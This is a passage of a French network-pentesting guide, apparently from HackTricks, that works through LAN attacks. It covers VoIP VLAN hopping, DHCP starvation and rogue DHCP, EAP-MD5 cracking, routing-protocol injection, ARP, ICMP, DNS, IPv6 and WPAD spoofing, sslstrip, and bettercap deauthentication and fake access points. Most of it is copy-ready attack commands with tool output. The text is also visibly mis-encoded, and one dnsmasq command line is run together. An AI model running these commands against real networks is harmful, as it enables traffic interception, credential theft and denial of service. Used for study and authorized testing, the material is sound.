**VoIP Hopper** prend en charge **trois** modes CDP. Le mode **sniff** inspecte les paquets r√©seau et tente de localiser l'ID VLAN. Pour l'utiliser, d√©finissez le param√®tre **`-c`** sur `0`. Le mode **spoof** g√©n√®re des paquets personnalis√©s similaires √† ceux qu'un v√©ritable appareil VoIP transmettrait dans le r√©seau d'entreprise. Pour l'utiliser, d√©finissez le param√®tre **`-c`** sur **`1`**. Le mode spoof avec un paquet **pr√©fabriqu√©** envoie les m√™mes paquets qu'un t√©l√©phone IP Cisco 7971G-GE. Pour l'utiliser, d√©finissez le param√®tre **`-c`** sur **`2`**.

Nous utilisons la derni√®re m√©thode car c'est l'approche la plus rapide. Le param√®tre **`-i`** sp√©cifie l'**interface r√©seau** de l'attaquant, et le param√®tre **`-E`** sp√©cifie le **nom de l'appareil VoIP** √† imiter. Nous avons choisi le nom SEP001EEEEEEEEE, qui est compatible avec le format de nommage Cisco pour les t√©l√©phones VoIP. Le format se compose du mot "SEP" suivi d'une adresse MAC. Dans les environnements d'entreprise, vous pouvez imiter un appareil VoIP existant en regardant l'√©tiquette MAC √† l'arri√®re du t√©l√©phone ; en appuyant sur le bouton Param√®tres et en s√©lectionnant l'option Informations sur le mod√®le sur l'√©cran d'affichage du t√©l√©phone ; ou en connectant le c√¢ble Ethernet de l'appareil VoIP √† votre ordinateur portable et en observant les demandes CDP de l'appareil √† l'aide de Wireshark.
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
Si l'outil s'ex√©cute avec succ√®s, **le r√©seau VLAN attribuera une adresse IPv4 au p√©riph√©rique de l'attaquant**.

### Attaques DHCP

#### √ânum√©ration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

Deux types de DoS pourraient √™tre effectu√©s contre les serveurs DHCP. Le premier consiste √† **simuler suffisamment de faux h√¥tes pour utiliser toutes les adresses IP possibles**.\
Cette attaque ne fonctionnera que si vous pouvez voir les r√©ponses du serveur DHCP et compl√©ter le protocole (**D√©couverte** (Comp) --> **Offre** (serveur) --> **Demande** (Comp) --> **ACK** (serveur)). Par exemple, cela **n'est pas possible dans les r√©seaux Wifi**.

Une autre fa√ßon d'effectuer un DoS DHCP est d'envoyer un **paquet DHCP-RELEASE en utilisant comme code source chaque IP possible**. Ensuite, le serveur pensera que tout le monde a fini d'utiliser l'IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Une fa√ßon plus automatique de faire cela est d'utiliser l'outil [DHCPing](https://github.com/kamorin/DHCPig)

Vous pourriez utiliser les attaques par d√©ni de service mentionn√©es pour forcer les clients √† obtenir de nouvelles baux dans l'environnement, et √©puiser les serveurs l√©gitimes pour qu'ils deviennent non r√©actifs. Ainsi, lorsque les l√©gitimes tentent de se reconnecter, **vous pouvez servir des valeurs malveillantes mentionn√©es dans la prochaine attaque**.

#### D√©finir des valeurs malveillantes

Vous pouvez utiliser le script DHCP de Responder (_/usr/share/responder/DHCP.py_) pour √©tablir un serveur DHCP frauduleux. D√©finir une passerelle malveillante n'est pas id√©al, car la connexion d√©tourn√©e est seulement en demi-duplex (c'est-√†-dire, nous capturons les paquets de sortie du client, mais pas les r√©ponses de la passerelle l√©gitime). Par cons√©quent, je recommanderais de d√©finir un serveur DNS ou WPAD frauduleux pour capturer le trafic HTTP et les informations d'identification en particulier.

| Description                                 | Exemple                                                                      |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| Notre adresse IP, annonc√©e comme passerelle | _-i 10.0.0.100_                                                              |
| Nom de domaine DNS local (optionnel)        | _-d example.org_                                                             |
| Adresse IP du routeur/passerelle d'origine  | _-r 10.0.0.1_                                                                |
| Adresse IP du serveur DNS primaire          | _-p 10.0.0.100_                                                              |
| Adresse IP du serveur DNS secondaire (optionnel) | _-s 10.0.0.1_                                                             |
| Le masque de sous-r√©seau du r√©seau local    | _-n 255.255.255.0_                                                           |
| L'interface pour √©couter le trafic DHCP     | _-I eth1_                                                                    |
| Adresse de configuration WPAD (URL)         | _-w ‚Äú[http://10.0.0.100/wpad.dat\n‚Äù](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| Fausser l'adresse IP de la passerelle par d√©faut | -S                                                                           |
| R√©pondre √† toutes les demandes DHCP (tr√®s bruyant) | -R                                                                           |

### **Attaques EAP**

Voici quelques tactiques d'attaque qui peuvent √™tre utilis√©es contre les impl√©mentations 802.1X :

* Force brute active du mot de passe via EAP
* Attaque du serveur RADIUS avec un contenu EAP malform√© _\*\*_(exploits)
* Capture de messages EAP et craquage de mot de passe hors ligne (EAP-MD5 et PEAP)
* Forcer l'authentification EAP-MD5 pour contourner la validation du certificat TLS
* Injection de trafic r√©seau malveillant lors de l'authentification en utilisant un concentrateur ou similaire

Si l'attaquant est entre la victime et le serveur d'authentification, il pourrait tenter de d√©grader (si n√©cessaire) le protocole d'authentification en EAP-MD5 et capturer la tentative d'authentification. Ensuite, il pourrait effectuer une force brute en utilisant :
```
eapmd5pass ‚Äìr pcap.dump ‚Äìw /usr/share/wordlist/sqlmap.txt
```
### Attaques FHRP (GLBP & HSRP) <a href="#6196" id="6196"></a>

**FHRP** (First Hop Redundancy Protocol) est une classe de protocoles r√©seau con√ßue pour **cr√©er un syst√®me de routage redondant √† chaud**. Avec FHRP, des routeurs physiques peuvent √™tre combin√©s en un seul dispositif logique, ce qui augmente la tol√©rance aux pannes et aide √† r√©partir la charge.

**Les ing√©nieurs de Cisco Systems ont d√©velopp√© deux protocoles FHRP, GLBP et HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Trois versions du protocole d'information de routage (RIP) existent : RIP, RIPv2 et RIPng. RIP et RIPv2 utilisent des datagrammes UDP envoy√©s aux pairs via le port 520, tandis que RIPng diffuse des datagrammes vers le port UDP 521 via un multicast IPv6. RIPv2 a introduit le support de l'authentification MD5. RIPng n'int√®gre pas d'authentification native ; elle repose plut√¥t sur des en-t√™tes IPsec AH et ESP optionnels dans IPv6.

Pour plus d'informations sur comment attaquer ce protocole, consultez le livre _**Network Security Assessment: Know Your Network (3rd edition).**_

### Attaques EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** est un protocole de routage dynamique. **C'est un protocole de vecteur de distance.** En l'absence d'**authentification** et de configuration des interfaces passives, un **intrus** peut perturber le routage EIGRP et provoquer **l'empoisonnement des tables de routage**. De plus, le r√©seau EIGRP (autrement dit, le syst√®me autonome) **est plat et n'est pas segment√© en zones**. Si un **attaquant injecte une route**, il est probable que cette route se **propage** dans tout le syst√®me autonome EIGRP.

Pour attaquer un syst√®me EIGRP, il faut **√©tablir une relation de voisinage avec un routeur EIGRP l√©gitime**, ce qui ouvre de nombreuses possibilit√©s, de la reconnaissance de base √† diverses injections.

\*\*\*\*[**FRRouting**](https://frrouting.org/) vous permet de mettre en place **un routeur virtuel prenant en charge BGP, OSPF, EIGRP, RIP et d'autres protocoles.** Il vous suffit de le d√©ployer sur le syst√®me de votre attaquant et vous pouvez r√©ellement vous faire passer pour un routeur l√©gitime dans le domaine de routage.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/) prend √©galement en charge la capture des diffusions EIGRP et l'injection de paquets pour manipuler la configuration de routage. Pour plus d'informations sur comment l'attaquer avec Coly, consultez _**Network Security Assessment: Know Your Network (3rd edition).**_

### OSPF

La plupart des impl√©mentations de l'Open Shortest Path First (OSPF) utilisent MD5 pour assurer l'authentification entre les routeurs. Loki et John the Ripper peuvent capturer et attaquer les hachages MD5 pour r√©v√©ler la cl√©, qui peut ensuite √™tre utilis√©e pour annoncer de nouvelles routes. Les param√®tres de routage sont d√©finis en utilisant l'onglet _Injection_, et la cl√© est d√©finie sous _Connection_.

Pour plus d'informations sur comment attaquer ce protocole, consultez le livre _**Network Security Assessment: Know Your Network (3rd edition).**_

### Autres Outils et Sources G√©n√©riques

* [**Above**](https://github.com/c4s73r/Above) : Outil pour scanner le trafic r√©seau et trouver des vuln√©rabilit√©s
* Vous pouvez trouver plus d'informations sur les attaques r√©seau [ici](https://github.com/Sab0tag3d/MITM-cheatsheet). _(TODO: Lisez tout et toutes les nouvelles attaques le cas √©ch√©ant)_

## **Spoofing**

L'attaquant configure tous les param√®tres r√©seau (GW, IP, DNS) du nouveau membre du r√©seau en envoyant de fausses r√©ponses DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

V√©rifiez la [section pr√©c√©dente](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste √† envoyer un paquet ICMP de type 1 code 5 qui indique que l'attaquant est le meilleur moyen d'atteindre une IP. Ensuite, lorsque la victime souhaite contacter l'IP, elle enverra le paquet via l'attaquant.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

L'attaquant r√©soudra certains (ou tous) les domaines demand√©s par la victime.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurer son propre DNS avec dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Passerelles locales

Plusieurs routes vers des syst√®mes et des r√©seaux existent souvent. Apr√®s avoir √©tabli une liste d'adresses MAC dans le r√©seau local, utilisez _gateway-finder.py_ pour identifier les h√¥tes prenant en charge le transfert IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Leurrage de LLMNR, NBT-NS et mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Les syst√®mes Microsoft utilisent la R√©solution de Nom Multicast de Liens Locaux (LLMNR) et le Service de Nom NetBIOS (NBT-NS) pour la r√©solution locale des h√¥tes lorsque les recherches DNS √©chouent. Apple Bonjour et les impl√©mentations de configuration z√©ro de Linux utilisent le Multicast DNS (mDNS) pour d√©couvrir les syst√®mes au sein d'un r√©seau. Ces protocoles ne sont pas authentifi√©s et diffusent des messages via UDP ; ainsi, les attaquants peuvent les exploiter pour rediriger les utilisateurs vers des services malveillants.

Vous pouvez vous faire passer pour des services recherch√©s par les h√¥tes en utilisant Responder pour envoyer de fausses r√©ponses.\
Lisez ici plus d'informations sur [comment se faire passer pour des services avec Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Leurrage de WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

De nombreux navigateurs utilisent la D√©couverte Automatique de Proxy Web (WPAD) pour charger les param√®tres de proxy depuis le r√©seau. Un serveur WPAD fournit les param√®tres de proxy client via une URL particuli√®re (par exemple, [http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)) lorsqu'il est identifi√© via l'un des moyens suivants :

- DHCP, en utilisant une entr√©e de code 252[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
- DNS, en recherchant le nom d'h√¥te _wpad_ dans le domaine local
- Microsoft LLMNR et NBT-NS (en cas d'√©chec de la recherche DNS)

Responder automatise l'attaque WPAD en ex√©cutant un proxy et en redirigeant les clients vers un serveur WPAD malveillant via DHCP, DNS, LLMNR et NBT-NS.\
Lisez ici plus d'informations sur [comment se faire passer pour des services avec Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Leurrage des dispositifs SSDP et UPnP](spoofing-ssdp-and-upnp-devices.md)

Vous pouvez proposer diff√©rents services dans le r√©seau pour essayer de **tromper un utilisateur** afin qu'il entre des **identifiants en clair**. **Plus d'informations sur cette attaque dans** [**Leurrage des dispositifs SSDP et UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### Leurrage de Voisin IPv6

Cette attaque est tr√®s similaire au Leurrage ARP mais dans le monde IPv6. Vous pouvez faire croire √† la victime que l'IPv6 de la passerelle a l'adresse MAC de l'attaquant.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### Spoofing/Flooding d'Annonces de Routeur IPv6

Certains syst√®mes d'exploitation configurent par d√©faut la passerelle √† partir des paquets RA envoy√©s dans le r√©seau. Pour d√©clarer l'attaquant en tant que routeur IPv6, vous pouvez utiliser :
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Spoofing DHCP IPv6

Par d√©faut, certains syst√®mes d'exploitation tentent de configurer le DNS en lisant un paquet DHCPv6 dans le r√©seau. Ainsi, un attaquant pourrait envoyer un paquet DHCPv6 pour se configurer en tant que serveur DNS. Le DHCP fournit √©galement une adresse IPv6 √† la victime.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fausse page et injection de code JS)

## Attaques Internet

### sslStrip

Essentiellement, ce que fait cette attaque, c'est que, dans le cas o√π l'**utilisateur** tente d'**acc√©der** √† une page **HTTP** qui se **redirige** vers la version **HTTPS**, **sslStrip** va **maintenir** une **connexion HTTP avec** le **client et** une **connexion HTTPS avec** le **serveur** afin de pouvoir **capturer** la connexion en **texte brut**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Plus d'informations [ici](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ et dns2proxy pour contourner HSTS

La **diff√©rence** entre **sslStrip+ et dns2proxy** par rapport √† **sslStrip** est qu'ils vont **rediriger** par exemple _**www.facebook.com**_ **vers** _**wwww.facebook.com**_ (notez le **"w" suppl√©mentaire**) et d√©finiront l'**adresse de ce domaine comme l'IP de l'attaquant**. De cette mani√®re, le **client** se **connectera** √† _**wwww.facebook.com**_ (l'attaquant) mais en arri√®re-plan, **sslstrip+** **maintiendra** la **vraie connexion** via https avec **www.facebook.com**.

Le **but** de cette technique est de **contourner HSTS** car _**wwww**.facebook.com_ ne sera pas enregistr√© dans le **cache** du navigateur, donc le navigateur sera tromp√© pour effectuer **l'authentification de Facebook en HTTP**.\
Notez que pour effectuer cette attaque, la victime doit essayer d'acc√©der initialement √† [http://www.faceook.com](http://www.faceook.com) et non en https. Cela peut √™tre fait en modifiant les liens √† l'int√©rieur d'une page http.

Plus d'informations [ici](https://www.bettercap.org/legacy/#hsts-bypass), [ici](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) et [ici](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ou sslStrip+ ne fonctionne plus. Cela est d√ª aux r√®gles HSTS pr√©enregistr√©es dans les navigateurs, donc m√™me si c'est la premi√®re fois qu'un utilisateur acc√®de √† un domaine "important", il y acc√©dera via HTTPS. De plus, notez que les r√®gles pr√©enregistr√©es et les autres r√®gles g√©n√©r√©es peuvent utiliser le drapeau** [**`includeSubdomains`**](https://hstspreload.appspot.com) **donc l'exemple de** _**wwww.facebook.com**_ **d√©crit pr√©c√©demment ne fonctionnera plus car** _**facebook.com**_ **utilise HSTS avec `includeSubdomains`.**

√Ä FAIRE : easy-creds, evilgrade, metasploit, factory

## √âcoute TCP sur le port
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## √âcoute TCP + SSL sur le port

#### G√©n√©rer des cl√©s et un certificat auto-sign√©
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### √âcoutez en utilisant un certificat
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### √âcouter en utilisant un certificat et rediriger vers les h√¥tes
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Parfois, si le client v√©rifie que le CA est valide, vous pourriez **servir un certificat d'un autre nom d'h√¥te sign√© par un CA**.\
Un autre test int√©ressant consiste √† servir un **certificat du nom d'h√¥te demand√© mais auto-sign√©**.

D'autres choses √† tester sont d'essayer de signer le certificat avec un certificat valide qui n'est pas un CA valide. Ou d'utiliser la cl√© publique valide, de forcer l'utilisation d'un algorithme comme diffie hellman (qui n'a pas besoin de d√©crypter quoi que ce soit avec la vraie cl√© priv√©e) et lorsque le client demande une sonde de la vraie cl√© priv√©e (comme un hash), envoyer une fausse sonde et esp√©rer que le client ne v√©rifie pas cela.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notes sur la d√©couverte active

Il faut prendre en compte que lorsqu'un paquet UDP est envoy√© √† un appareil qui n'a pas le port demand√©, un ICMP (Port Unreachable) est renvoy√©.

### **D√©couverte ARP**

Les paquets ARP sont utilis√©s pour d√©couvrir quelles adresses IP sont utilis√©es √† l'int√©rieur du r√©seau. L'ordinateur doit envoyer une requ√™te pour chaque adresse IP possible et seules celles qui sont utilis√©es r√©pondront.

### **mDNS (multicast DNS)**

Bettercap envoie une requ√™te MDNS (toutes les X ms) demandant **\_services\_.dns-sd.\_udp.local**. La machine qui voit ce paquet r√©pond g√©n√©ralement √† cette demande. Ensuite, il ne recherche que les machines r√©pondant aux "services".

**Outils**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap diffuse des paquets vers le port 137/UDP demandant le nom "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap diffuse des paquets SSDP recherchant tous types de services (Port UDP 1900).

### **WSD (Web Service Discovery)**

Bettercap diffuse des paquets WSD recherchant des services (Port UDP 3702).

## R√©f√©rences

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Astuce de prime de bug**: **Inscrivez-vous** sur **Intigriti**, une plateforme de prime de bug premium cr√©√©e par des hackers, pour des hackers**! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui, et commencez √† gagner des primes allant jusqu'√† **100 000 $**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
